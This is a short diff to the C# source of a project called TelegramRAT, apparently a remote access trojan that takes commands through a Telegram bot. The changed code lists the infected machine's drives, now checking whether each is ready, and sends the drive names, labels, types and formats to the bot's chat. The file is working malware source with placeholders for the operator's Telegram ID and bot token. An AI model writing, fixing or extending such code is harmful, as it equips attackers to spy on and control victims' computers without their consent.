@@ -25,6 +25,7 @@ namespace TelegramRAT
     public static class Program
     {
         static TelegramBotClient Bot;
+        
 
         readonly static long? OwnerId = null; // Place your Telegram id here or keep it null.
         readonly static string BotToken = null; // Place your Telegram bot token. 
@@ -38,6 +39,8 @@ namespace TelegramRAT
 
         static void Main(string[] args)
         {
+            
+            
             string thisprocessname = Process.GetCurrentProcess().ProcessName;
 
             if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
@@ -1710,10 +1713,19 @@ namespace TelegramRAT
                             foreach (DriveInfo drive in drives)
                             {
                                 drivesStr.Append(
-                                $"Name: {drive.Name}\n" +
-                                $"Label: {drive.VolumeLabel}\n" +
-                                $"Type: {drive.DriveType}\n" +
-                                $"Format: {drive.DriveFormat}\n\n");
+                                    $"Name: {drive.Name}\n" +
+                                    $"IsReady: {drive.IsReady}\n");
+                                if (drive.IsReady)
+                                {
+                                    drivesStr.Append(
+                                    $"Label: {drive.VolumeLabel}\n" +
+                                    $"Type: {drive.DriveType}\n" +
+                                    $"Format: {drive.DriveFormat}\n\n");
+                                }
+                                else
+                                {
+                                    drivesStr.AppendLine();
+                                }
                             }                            
                             Bot.SendTextMessageAsync(update.Message.Chat.Id, string.Join(string.Empty, drivesStr.ToString().Take(4096).ToArray()), ParseMode.Html, replyToMessageId: update.Message.MessageId);
                         }
